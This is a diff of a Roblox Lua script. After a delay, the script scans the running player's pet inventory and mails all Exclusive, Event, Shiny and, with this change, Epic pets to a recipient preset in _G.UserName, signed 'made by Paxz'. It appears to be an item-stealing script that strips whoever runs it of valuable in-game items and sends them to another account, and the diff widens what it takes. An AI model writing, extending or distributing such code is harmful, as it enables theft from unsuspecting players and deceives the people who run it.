@@ -66,7 +66,7 @@ end
 wait(30)
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
     if v:IsA("TextButton") then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") or v:FindFirstChild("RarityGradient"):FindFirstChild("Shiny") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") or v:FindFirstChild("RarityGradient"):FindFirstChild("Shiny") or v:FindFirstChild("RarityGradient"):FindFirstChild("Epic") then
             local args = {
                 [1] = {
                     ["Recipient"] = _G.UserName,
@@ -74,7 +74,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                     ["Pets"] = {
                         [1] = v.Name
                     },
-                    ["Message"] = "made by Paxz _G.Message", _G.Message
+                    ["Message"] = "made by Paxz _G.Message"
                 }
             }
         Networking.Invoke("Send Mail", unpack(args))
